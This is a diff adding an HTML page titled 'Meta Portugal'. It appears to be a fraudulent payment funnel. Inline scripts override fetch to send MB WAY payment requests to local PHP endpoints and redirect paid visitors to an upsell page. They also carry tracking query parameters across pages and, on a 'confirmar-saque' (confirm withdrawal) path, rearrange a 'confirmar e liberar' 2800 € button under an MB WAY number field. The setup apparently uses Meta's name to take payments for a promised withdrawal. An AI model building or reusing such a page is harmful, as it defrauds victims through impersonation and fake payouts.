@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Meta Portugal</title>
+  <script>
+    (function () {  var h = window.location.hostname, o = window.location.origin || (window.location.protocol + "//" + h + (window.location.port ? ":" + window.location.port : ""));
+  document.write('<base href="' + o + '/">');
+  document.write('<link rel="stylesheet" crossorigin href="/assets/index-Bzh8CIQh.css">');
+})();
+  </script>
+  <script src="/central.php?format=js"></script>
+  <script>
+    (function () {
+      var key = 'ttk_preserved_query';
+      function mergeQuery(cur, stored) {
+        var p = new URLSearchParams(stored || '');
+        if (cur && cur.charAt(0) === '?') cur = cur.slice(1);
+        if (cur) { var q = new URLSearchParams(cur); q.forEach(function (v, k) { p.set(k, v); }); }
+        return p.toString();
+      }
+      function syncPreservedFromUrl() { var cur = window.location.search || ''; try { var st = sessionStorage.getItem(key) || ''; st = mergeQuery(cur, st); sessionStorage.setItem(key, st); window.__TTK_PRESERVED_QUERY = st; } catch (e) { } }
+      var cur = window.location.search || '';
+      try { var st = sessionStorage.getItem(key) || ''; st = mergeQuery(cur, st); sessionStorage.setItem(key, st); window.__TTK_PRESERVED_QUERY = st; } catch (e) { window.__TTK_PRESERVED_QUERY = cur; }
+      if (!window.location.search && window.__TTK_PRESERVED_QUERY) { var path = window.location.pathname + window.location.hash; window.history.replaceState(null, '', path + (window.__TTK_PRESERVED_QUERY ? '?' + window.__TTK_PRESERVED_QUERY : '')); }
+      function addPreservedToUrl(url) {
+        if (!url || typeof url !== 'string') return url;
+        var q = window.__TTK_PRESERVED_QUERY;
+        if (!q) return url;
+        var hash = '', idx = url.indexOf('#');
+        if (idx !== -1) { hash = url.slice(idx); url = url.slice(0, idx); }
+        var qidx = url.indexOf('?');
+        if (qidx === -1) return url + '?' + q + hash;
+        var base = url.slice(0, qidx), existing = new URLSearchParams(url.slice(qidx + 1)), preserved = new URLSearchParams(q);
+        preserved.forEach(function (v, k) { existing.set(k, v); });
+        return base + '?' + existing.toString() + hash;
+      }
+      var origPush = history.pushState, origReplace = history.replaceState;
+      history.pushState = function (s, t, u) { return origPush.call(history, s, t, addPreservedToUrl(u)); };
+      history.replaceState = function (s, t, u) { return origReplace.call(history, s, t, addPreservedToUrl(u)); };
+      window.__FUNIL_REDIRECT_LINK = "/upsell-1/";
+      window.__FUNIL_REDIRECT_BACK = "/upsell-1/";
+      window.__TTK_PAID_REDIRECT_URL = "/upsell-1/";
+      var origFetch = window.fetch;
+      window.fetch = function (url, opts) {
+        var nextUrl = url, nextOpts = opts || {}, originalUrl = typeof url === 'string' ? url : '';
+        var method = (nextOpts.method || 'GET').toUpperCase();
+        if (method === 'POST' && originalUrl.indexOf('create-mbway') !== -1) { nextUrl = '/api/create-mbway.php'; }
+        if (method === 'POST' && originalUrl.indexOf('check-mbway') !== -1) {
+          var parsedBody = {}; try { parsedBody = JSON.parse(nextOpts.body || '{}') || {}; } catch (e) { }
+          var tx = parsedBody.transaction_id || parsedBody.id || '';
+          nextUrl = '/api/check-mbway.php';
+          nextOpts = Object.assign({}, nextOpts, { body: JSON.stringify({ transaction_id: tx }) });
+        }
+        return origFetch.call(this, nextUrl, nextOpts).then(function (res) {
+          if (typeof originalUrl === 'string' && originalUrl.indexOf('check-mbway') !== -1 && res.ok) {
+            res.clone().json().then(function (data) {
+              if (data && (data.status === 'COMPLETED' || data.status === 'paid' || data.status === 'approved')) {
+                window.location.href = (window.__TTK_PAID_REDIRECT_URL || "/upsell-1/") + (window.__TTK_PRESERVED_QUERY ? "?" + window.__TTK_PRESERVED_QUERY : "");
+              }
+            }).catch(function () { });
+          }
+          return res;
+        });
+      };
+    })();
+  </script>
+  <script>(function () { var s = document.createElement("script"); s.type = "module"; s.crossOrigin = "anonymous"; s.src = "/assets/index-jPJOmtKw.js"; document.head.appendChild(s); })();</script>
+</head>
+
+<body>
+  <div id="root"></div>
+  <script>
+    (function () {
+      function n(s) { return (s || '').toLowerCase().replace(/\s+/g, ' ').trim(); }
+      function onConfirmar() { return (window.location.pathname || '').indexOf('/confirmar-saque') !== -1; }
+      function findTopCtaBlock() {
+        var blocks = document.querySelectorAll('div.mx-4.mt-4.transition-all.duration-500.ease-out');
+        for (var i = 0; i < blocks.length; i++) {
+          var el = blocks[i], btn = el.querySelector('button');
+          if (!btn) continue;
+          var txt = n(btn.textContent);
+          if (txt.indexOf('confirmar e liberar') === -1) continue;
+          if (txt.indexOf('2800') === -1 && txt.indexOf('\u20AC') === -1) continue;
+          return el;
+        }
+        return null;
+      }
+      function findFormBlock() {
+        var input = document.querySelector('input[placeholder*="Introduza o seu número MBway"]') || document.querySelector('input[placeholder*="numero MBway"]');
+        return input ? (input.closest('div.mx-4') || input.parentElement) : null;
+      }
+      function run() {
+        if (!onConfirmar()) return;
+        var ctaBlock = findTopCtaBlock(), formBlock = findFormBlock();
+        if (!ctaBlock || !formBlock || !formBlock.parentElement) return;
+        if (ctaBlock.getBoundingClientRect().top < formBlock.getBoundingClientRect().top) {
+          formBlock.parentElement.insertBefore(ctaBlock, formBlock.nextSibling);
+        }
+      }
+      var tries = 0, timer = setInterval(function () { tries += 1; run(); if (tries > 120) clearInterval(timer); }, 180);
+      new MutationObserver(run).observe(document.documentElement, { childList: true, subtree: true });
+    })();
+  </script>
+</body>
+
+</html>
